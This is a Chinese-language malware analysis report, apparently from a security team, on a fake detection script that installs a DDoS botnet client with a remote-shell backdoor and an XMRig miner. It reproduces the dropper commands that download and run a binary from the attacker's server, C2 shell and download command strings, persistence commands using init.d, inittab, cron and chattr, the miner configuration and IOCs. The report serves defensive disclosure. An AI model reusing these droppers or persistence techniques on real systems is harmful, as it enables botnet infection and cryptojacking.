# 伪造检测脚本木马分析报告

**分析日期**: 2026-08-08  
**目标URL**: `http://wzjc.ipwz666.space/run.sh`  
**分析方式**: 纯静态分析，未运行任何样本  
**分析人**: 破晓安全中心 https://t.me/ZeroDawnTeam

---

## 一、结论

**此伪造检测脚本除了上报IP，也是 DDoS 僵尸网络客户端 + 门罗币矿机的投放器。**

以"伪造检测"为幌子，诱导用户执行 `run.sh`，实际下载并运行：
1. **UDP DDoS 攻击客户端**（`client`，已从服务器删除）- 带远程命令执行后门
2. **XMRig 门罗币矿机**（`filter`，仍在服务器上）- 驻留挖矿

服务器 `wzjc.ipwz666.space` 意外暴露了完整 home 目录列表，使全量取证成为可能。

---

## 二、完整证据链

### 证据 1：初始投放脚本 `run.sh`

**文件**: `run.sh` (226 bytes)  
**SHA256**: `eff8ea74fd177ba3980ec077540eb8aec2688e2231b5e34cd3ea8ae19c6674df`

```bash
# 下载客户端
echo "正在下载客户端..."
wget -P /root http://wzjc.ipwz666.space/client -O /root/client

# 修改权限并运行
echo "正在修改文件权限并运行客户端..."
chmod 777 /root/client
/root/client
```

**要点**: 下载 `/client` 二进制并直接以 root 执行。`client` 文件目前已从服务器删除（返回 404），但通过其他证据可还原其完整功能。

---

### 证据 2：DDoS 僵尸网络客户端 `udpclient`（MIPS 架构）

**文件**: `udpclient_mipsel` (162KB) 和 `sysbak_hidden` (162KB)  
**SHA256**: `230d811c2eba3b7c77956e4a34099220dd41ded40a032d214d6005ea63ad0910`（两者 MD5 完全一致）  
**来源**: `http://wzjc.ipwz666.space/rootfs-mipsel/usr/bin/udpclient`  
**文件类型**: ELF 32-bit MSB, MIPS, MIPS-I, static-pie, stripped

从服务器的 MIPS 根文件系统目录中提取，这是实际部署到路由器/IoT 设备上的 DDoS 客户端。`client`（run.sh 下载的 x86_64 版本）已被作者删除，但 MIPS 版功能一致。

#### 2a. C2 协议（远程控制后门）

从二进制 strings 提取的 C2 命令协议：

| 命令前缀 | 功能 | 证据字符串 |
|----------|------|-----------|
| `HELLO\|%s\|%s\|%s\|%d\|%d` | 客户端注册/心跳上报 | 发送 IP、国家、架构等信息到 C2 |
| `METRICS\|CPU:%.2f%%\|BW:%.2fMB/s` | 系统指标上报 | CPU 使用率 + 带宽 |
| `SHELL\|` | **远程命令执行** | `%s >> /tmp/udp_shell.log 2>&1` |
| `DOWNLOAD\|` | **远程下载执行** | `/usr/bin/curl -s -o /root/$(basename %s) %s` |
| `STOP` | 停止所有攻击 | `stop_all_attacks` |

**关键函数名（从 strings 提取）**: `handle_commands`, `report_stats`, `fetch_public_info`, `install_persistence`, `ensure_self_copy`, `daemonize`, `killer`

#### 2b. 本机 IP 上报机制（用户关注的核心问题）

```
ip-api.com
GET /json HTTP/1.0
Host: ip-api.com
Connection: close
"query"
"country"
```

客户端启动后通过 `ip-api.com` API 获取本机公网 IP（`"query"` 字段）和国家（`"country"` 字段），然后通过 `HELLO` 消息上报到 C2 服务器。**这正是用户询问的"悄悄发送本机IP到服务器"行为。**

函数 `fetch_public_info` 负责此操作，`report_stats` 定期上报系统指标。

#### 2c. 三种 DDoS 攻击模式

| 攻击类型 | 进程函数 | 线程函数 |
|----------|----------|----------|
| UDP Flood | `udp_attack_process` | `udp_thread_func` |
| SYN Flood | `syn_attack_process` | `syn_thread_func` |
| ACK Flood | `ack_attack_process` | `ack_thread_func` |

管理变量: `attack_count`, `attack_mutex`, `attack_pids`

#### 2d. 持久化机制（5 重驻留 + 不可变属性）

从二进制中提取的持久化字符串：

```
# init.d 服务
/etc/init.d/udpclient
update-rc.d udpclient defaults >/dev/null 2>&1 || chkconfig --add udpclient

# inittab 持久驻留（被杀自动重启）
zombie:2345:respawn:udpclient

# /etc/profile（每次登录触发）
（profile 文件末尾追加 /usr/bin/udpclient）

# crontab @reboot
@reboot %s >/dev/null 2>&1
crontab -l 2>/dev/null > /tmp/.cronudp
crontab /tmp/.cronudp && rm -f /tmp/.cronudp

# 不可变属性（防止删除）
chattr +i %s 2>/dev/null
chattr +i /etc/init.d/udpclient 2>/dev/null
chattr +i /etc/inittab 2>/dev/null
chattr +i /etc/profile 2>/dev/null
chattr +i /etc/rc.local 2>/dev/null
```

**实际部署的持久化文件**（从服务器 rootfs-mipsel 目录提取）：

- `rootfs_mipsel_init_udpclient` - init.d 服务脚本，内容：
  ```sh
  #!/bin/sh
  ### BEGIN INIT INFO
  # Provides: udpclient
  # Required-Start: $network
  # Default-Start: 2 3 4 5
  # Default-Stop: 0 1 6
  ### END INIT INFO
  case "$1" in
    start) /usr/bin/udpclient &;;
    stop) pkill -f /usr/bin/udpclient;;
    *) echo 'Usage: $0 {start|stop}'; exit 1;;
  esac
  ```

- `rootfs_mipsel_profile` - 修改后的 `/etc/profile`，**最后一行被追加**: `/usr/bin/udpclient`

#### 2e. 自我复制与隐藏备份

```
ensure_self_copy
cp -f %s %s
/var/tmp/.sysbak
```

- 复制自身到 `/var/tmp/.sysbak`（隐藏文件）
- `udpclient_mipsel` 和 `sysbak_hidden` 的 MD5 完全一致，证实是同一文件的副本

#### 2f. 进程伪装（13 种系统进程名）

客户端会伪装为以下系统进程名逃避检测：

```
kblockd, khelper, sync_supers, keepalived, acpid, avahi-daemon,
dbus-daemon, gnome-shell, rsyslogd, systemd, systemd-logind,
systemd-udevd, upstart
```

#### 2g. 看门狗与反清除

```
WATCHDOG_RESTART    # 被杀后自动重启
KILLER              # 杀死竞争进程
killer_enabled      # killer 开关
zombie:2345:respawn:udpclient  # inittab 级 respawn
```

---

### 证据 3：XMRig 门罗币矿机 `filter`

**文件**: `filter` (3.0MB, UPX 加壳) / `filter_unpacked` (8.1MB, 解壳后)  
**SHA256 (packed)**: `618b912fc5556eb9cee63c6beb5d41ad70474942879582faaf4588bbf2457c0b`  
**SHA256 (unpacked)**: `83d68eaa084e335b8131576e454b22fe45f0135708fbbc2d4265f1d810e94c6b`  
**文件类型**: ELF 64-bit LSB, x86-64, statically linked, UPX packed

#### 3a. 身份确认

从解壳后二进制 strings 提取的关键标识：

```
XMRig 6.26.0-C4              # 版本号
/root/xmrig-C3/scripts/build/ # 编译路径
Usage: xmrig [OPTIONS]        # XMRig 命令行帮助
```

**确认**: `filter` 就是 XMRig 6.26.0 矿机，编译路径显示源码目录为 `/root/xmrig-C3/`。

#### 3b. 矿池配置 `config.json`

**文件**: `config.json` (2.5KB)  
**SHA256**: `193c1c7dc9f30fa413a7a65c62083de23cc1aee107f3d2a1ac91e0790b7ae230`

```json
{
    "pools": [{
        "url": "auto.c3pool.org:17777",
        "user": "88LDNGE7BiYaSVHqDGuew1i6mvX4ufhrB7g1C5YaNCSPcUzG3aVTuTaKw25yrfcu88YrSoQDyUYCifKkfU4zYPSd75YP8Ah",
        "pass": "x",
        "tls": false
    }],
    "cpu": {
        "enabled": true,
        "max-threads-hint": 500
    },
    "randomx": { "mode": "auto" }
}
```

- **矿池**: C3Pool (`auto.c3pool.org:17777`)
- **钱包**: `88LDNGE7BiYaSVHqDGuew1i6mvX4ufhrB7g1C5YaNCSPcUzG3aVTuTaKw25yrfcu88YrSoQDyUYCifKkfU4zYPSd75YP8Ah`
- **算法**: RandomX (Monero)
- **CPU 挖矿**: 最多 500 线程

从解壳后 strings 提取的额外矿池域名: `auto.c3pool.org`, `c3pool.com`, `api.xmrig.com`

---

### 证据 4：文件分发服务器源码 `xiazai.go`

**文件**: `xiazai.go` (2.0KB)  
**SHA256**: `178b8177b274568636324852251acd2feeab4d6e7840d557de98867079a9add8`

Go 语言编写的 HTTP 文件服务器，功能：
- 服务当前目录和 `./web/` 目录的文件
- **记录每个访问者的 IP 地址**（`clientIP, _, _ := net.SplitHostPort(r.RemoteAddr)`）
- 通过 `curl ifconfig.me` 获取自身公网 IP

```go
// 关键代码：记录下载者 IP
clientIP, _, _ := net.SplitHostPort(r.RemoteAddr)
fmt.Printf("[%s] %s %s %d (%v)\n", start.Format("2006-01-02 15:04:05"),
    clientIP, r.URL.Path, lrw.statusCode, time.Since(start))
```

**要点**: 任何人下载 `client` 或其他文件，其 IP 都会被记录。这是 IP 收集的第一层（下载阶段），第二层是 `udpclient` 运行后通过 `ip-api.com` 上报。

---

### 证据 5：Telegram C2 通信

**文件**: `telegram_c2_evidence.txt`（从 `.bash_history` 提取）

从 bash_history 第 66-96 行提取的 Telegram Bot 操作：

```bash
# 获取 Bot 更新（接收命令）
curl -s "https://api.telegram.org/bot7642554965:***/getUpdates"

# 发送消息（C2 通知/报告）
curl -X POST "https://api.telegram.org/bot7642554965:***/sendMessage" \
  -H "Content-Type: application/json" \
  -d '{"chat_id": 7210850213, "text": "这是一条测试消息"}'
```

- **Bot Token**: `7642554965:***`（中间部分在 history 中被遮蔽）
- **Chat ID**: `7210850213`
- **用途**: 管理脚本 `mg.py` 和 `ccmg.go` 通过 Telegram Bot 接收指令和发送报告

---

### 证据 6：交叉编译多架构客户端

**文件**: `cross_compile_evidence.txt`（从 `.bash_history` 提取）  
**辅助文件**: `musl_config.mak`（内容: `TARGET = sh4-linux-musl`）

bash_history 显示作者为多种架构编译 `udp.c`（UDP DDoS 工具源码）：

| 架构 | 编译命令 | 目标设备 |
|------|----------|----------|
| MIPS (mipsel) | `mipsel-linux-gnu-gcc -fcommon udp.c -o mipsel -static` | 路由器、IoT 设备 |
| SH4 | `sh4-linux-musl-gcc -static -s -O2 -D_GNU_SOURCE -o linux_sh4 udp.c -pthread` | SH4 架构设备 |
| AMD64 | `CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o xiazai xiazai.go` | 标准 x86 服务器 |
| RISC-V 32 | `wget https://musl.cc/riscv32-linux-musl-cross.tgz` | RISC-V 设备 |

使用 QEMU (`qemu-mipsel-static`) 在 chroot 环境中测试 MIPS 二进制。

`musl-cross-make` 工具链的 `config.mak` 确认目标为 `sh4-linux-musl`。

---

### 证据 7：作者清理自身测试机的挣扎

**文件**: `persistence_evidence.txt`（从 `.bash_history` 提取）

bash_history 第 231-407 行显示作者花费大量精力编写清理脚本，试图从自己的测试机上移除 `udpclient`。这反证了持久化机制的有效性：

```bash
# 典型清理流程（反复出现 10+ 次）
pkill -f udpclient
pkill -f /var/tmp/.sysbak
chattr -i /usr/bin/udpclient /var/tmp/.sysbak /etc/rc.local /etc/init.d/udpclient /etc/inittab /etc/profile
rm -f /usr/bin/udpclient /var/tmp/.sysbak /tmp/.cronudp /tmp/udp_shell.log
sed -i "/udpclient/d" /etc/rc.local
crontab -l | grep -v udpclient | crontab -
update-rc.d udpclient remove
chkconfig --del udpclient
rm -f /etc/init.d/udpclient
sed -i "/udpclient/d" /etc/inittab
sed -i "/\/usr\/bin\/udpclient/d" /etc/profile
```

甚至在绝望中尝试杀死内核线程（`kworker|ksoftirqd|watchdog`）和创建空占位文件（`touch /usr/bin/udpclient`），多次 `reboot`。

---

### 证据 8：SSH 与服务器信息

**文件**: `ssh_authorized_keys` (564 bytes)

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEl7B1K7PXSvUN/... ssh-key-2022-10-18
```

authorized_keys 中的命令限制为 Oracle Cloud 默认提示（"Please login as the user ubuntu"），结合 `snap/oracle-cloud-agent/` 目录，确认服务器为 **Oracle Cloud 实例**。

**域名**: `wzjc.ipwz666.space`，通过 Cloudflare CDN（`Server: cloudflare`），IPv6 `2606:4700:3036::ac43:d2af`。

---

### 证据 9：构建脚本 `go.sh`

**文件**: `go.sh` (3.8KB)  
**SHA256**: `1d9e6238358c08b1b6c263fcde4d1e7f26fac9d09fd11a3accba82cc25ab6e0f`

Go 编译脚本，编译 `bp.go`（未获取到源码），依赖：
- `github.com/pkg/sftp` - SFTP 文件传输
- `golang.org/x/crypto/ssh` - SSH 远程连接

**要点**: `bp.go` 可能是 SSH 蠕虫传播模块，通过 SSH/SFTP 横向移动到其他服务器。

---

### 证据 10：`.wget-hsts` 下载历史

**文件**: `.wget-hsts` (261 bytes)

```
go.dev               # Go 工具链下载
dl-cdn.alpinelinux.org  # Alpine Linux（MIPS 根文件系统）
mirrors.tuna.tsinghua.edu.cn  # 清华镜像源
```

证实作者从清华镜像源下载工具，时区与中国一致。

---

## 三、文件清单

| 文件 | 大小 | 说明 |
|------|------|------|
| `run.sh` | 226B | 初始投放脚本 |
| `config.json` | 2.5KB | XMRig 矿池配置 |
| `go.sh` | 3.8KB | Go 编译脚本（SSH/SFTP 工具） |
| `xiazai.go` | 2.0KB | 文件分发服务器源码 |
| `.bash_history` | 16KB | 完整操作历史（核心证据） |
| `.bashrc` | 3.2KB | Bash 配置 |
| `.profile` | 161B | Profile 配置 |
| `.wget-hsts` | 261B | 下载历史 |
| `test` | 122KB | 未知数据文件 |
| `filter` | 3.0MB | UPX 加壳的 XMRig 矿机 |
| `filter_packed_upx` | 3.0MB | filter 的备份副本（加壳） |
| `filter_unpacked` | 8.1MB | UPX 解壳后的 XMRig 矿机 |
| `udpclient_mipsel` | 162KB | MIPS DDoS 客户端+后门 |
| `sysbak_hidden` | 162KB | udpclient 的隐藏副本（MD5 一致） |
| `ssh_authorized_keys` | 564B | SSH 公钥（Oracle Cloud） |
| `rootfs_mipsel_profile` | 788B | 被篡改的 /etc/profile |
| `rootfs_mipsel_init_udpclient` | 277B | init.d 持久化脚本 |
| `musl_config.mak` | 48B | 交叉编译配置（TARGET=sh4-linux-musl） |
| `udpclient_strings.txt` | 7.9KB | udpclient 关键 strings |
| `udpclient_all_strings.txt` | 7.4KB | udpclient 全部唯一 strings |
| `filter_unpacked_all_strings.txt` | 361KB | XMRig 全部 strings |
| `xmrig_evidence.txt` | 5.4KB | XMRig 证据 strings |
| `telegram_c2_evidence.txt` | 375B | Telegram C2 证据 |
| `cross_compile_evidence.txt` | 5.8KB | 交叉编译证据 |
| `persistence_evidence.txt` | 7.1KB | 持久化/清理证据 |
| `file_hashes.txt` | 1.5KB | 全部文件 SHA256 哈希 |

---

## 四、攻击架构总结

```
┌─────────────────────────────────────────────────────────────┐
│                    攻击者基础设施                             │
│                                                             │
│  Oracle Cloud 实例 (wzjc.ipwz666.space)                     │
│  ├── xiazai.go (文件分发服务器, 记录下载者IP)                │
│  ├── Telegram Bot (7642554965:***, Chat ID: 7210850213)    │
│  ├── mg.py / ccmg.go (C2 管理脚本)                          │
│  └── filter (XMRig 矿机 → auto.c3pool.org:17777)           │
│                                                             │
└──────────────┬──────────────────────────────────────────────┘
               │
               │ run.sh 诱导执行
               ▼
┌─────────────────────────────────────────────────────────────┐
│                    受害者机器                                │
│                                                             │
│  1. run.sh 下载并执行 client (x86_64 DDoS 客户端)           │
│     ├── 上报自身服务器IP地址                                                           │
│  2. udpclient 启动后:                                       │
│     ├── fetch_public_info():                                │
│     │   GET ip-api.com/json → 获取本机公网IP + 国家          │
│     │   HELLO|IP|国家|架构|... → 上报 C2 服务器              │
│     │                                                       │
│     ├── install_persistence(): 5 重驻留                     │
│     │   ├── /etc/init.d/udpclient (init.d 服务)             │
│     │   ├── /etc/rc.local (启动脚本)                        │
│     │   ├── /etc/inittab (respawn: 被杀自动重启)            │
│     │   ├── /etc/profile (每次登录触发)                      │
│     │   ├── crontab @reboot (开机重启)                      │
│     │   └── chattr +i (不可变属性防删除)                     │
│     │                                                       │
│     ├── ensure_self_copy(): 复制到 /var/tmp/.sysbak         │
│     │                                                       │
│     ├── handle_commands(): 等待 C2 指令                     │
│     │   ├── SHELL|cmd → 远程命令执行                        │
│     │   ├── DOWNLOAD|url → 下载并执行文件                   │
│     │   ├── STOP → 停止攻击                                 │
│     │   └── 攻击指令 → UDP/SYN/ACK Flood                    │
│     │                                                       │
│     ├── report_stats(): 定期上报 CPU + 带宽                  │
│     │                                                       │
│     ├── WATCHDOG_RESTART: 被杀自动重启                       │
│     │                                                       │
│     └── KILLER: 杀死竞争进程, 伪装为 13 种系统进程名         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 五、已删除/未获取的文件

以下文件在服务器上返回 404，已被作者删除，但功能可从 bash_history 和 udpclient strings 还原：

| 文件 | 说明 | 证据来源 |
|------|------|----------|
| `client` | x86_64 DDoS 客户端（run.sh 下载的目标） | bash_history 交叉编译记录 + udpclient_mipsel |
| `udp.c` | DDoS 工具 C 源码 | bash_history 编译命令 |
| `jxby.sh` | 部署脚本 | bash_history 多次执行 |
| `mn.sh` | 管理脚本 | bash_history 多次执行 |
| `mg.py` | Python C2 管理脚本 | bash_history + pip install dnslib/flask |
| `ccmg.go` | Go C2 管理脚本 | bash_history 多次执行 |
| `bp.go` | SSH 蠕虫传播模块 | go.sh 依赖 SSH/SFTP 库 |
| `web/` 目录 | 分发的客户端二进制目录 | bash_history unzip web.zip |

---

## 七、IOCs（可入侵指标）

### 域名/URL
- `wzjc.ipwz666.space` - C2 服务器
- `ip-api.com` - IP 地理位置查询（客户端使用）
- `auto.c3pool.org:17777` - XMRig 矿池
- `api.telegram.org` - Telegram C2

### 文件路径（受害者机器）
- `/usr/bin/udpclient` - DDoS 客户端
- `/var/tmp/.sysbak` - 隐藏备份副本
- `/tmp/.cronudp` - crontab 临时文件
- `/tmp/udp_shell.log` - 命令执行日志
- `/etc/init.d/udpclient` - init.d 服务
- `/root/client` - 初始下载的客户端

### 钱包地址
- `88LDNGE7BiYaSVHqDGuew1i6mvX4ufhrB7g1C5YaNCSPcUzG3aVTuTaKw25yrfcu88YrSoQDyUYCifKkfU4zYPSd75YP8Ah` (Monero)

### Telegram
- Bot Token: `7642554965:***`
- Chat ID: `7210850213`

### 进程名伪装
- `kblockd`, `khelper`, `sync_supers`, `keepalived`, `acpid`, `avahi-daemon`, `dbus-daemon`, `gnome-shell`, `rsyslogd`, `systemd`, `systemd-logind`, `systemd-udevd`, `upstart`

### inittab 持久化标识
- `zombie:2345:respawn:udpclient`

---

*报告结束。所有证据文件存放于 `/tmp/qingmeng/` 目录。*
